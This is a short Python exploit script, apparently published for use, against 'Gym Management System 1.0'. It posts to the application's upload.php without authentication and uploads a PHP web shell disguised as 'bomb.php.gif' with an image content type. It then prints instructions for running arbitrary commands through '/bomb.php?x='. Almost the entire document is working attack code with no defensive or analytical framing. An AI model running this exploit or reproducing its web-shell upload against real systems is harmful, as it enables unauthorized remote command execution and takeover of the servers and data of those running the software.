#!/usr/bin/python3

import requests
import os
import sys
import time

banner = """

 Gym Management System 1.0 Unauthenticaded RCE exploit
 Author - nuker
 Date - 8/18/22

"""
r = requests.Session()

def checkconnection():
        rsp = r.get("http://10.10.10.198:8080/upload.php")
        if rsp.status_code != 200:
                connected = False
        else:
                connected = True
        return connected
        
def uploadfile():
        myfile = {'file' : ('bomb.php.gif', '<?php echo shell_exec($_GET["x"]); ?>', 'image/png')}
        filedata = {'pupload' : 'upload'}
        r.post("http://10.10.10.198:8080/upload.php?id=bomb", files=myfile, data=filedata)
        return 1
        
if __name__ == "__main__":
        if checkconnection() == True:
                print(banner)
                print('[ |!| ] Connected, uploading file..')
                time.sleep(2)
                uploadfile()
                print('[ |!| ] File has been uploaded at "/upload/bomb.php", usage -->> /bomb.php?x=[command]\n')
        else:
                print('[ |!!| ] Unsuccessful file upload.')
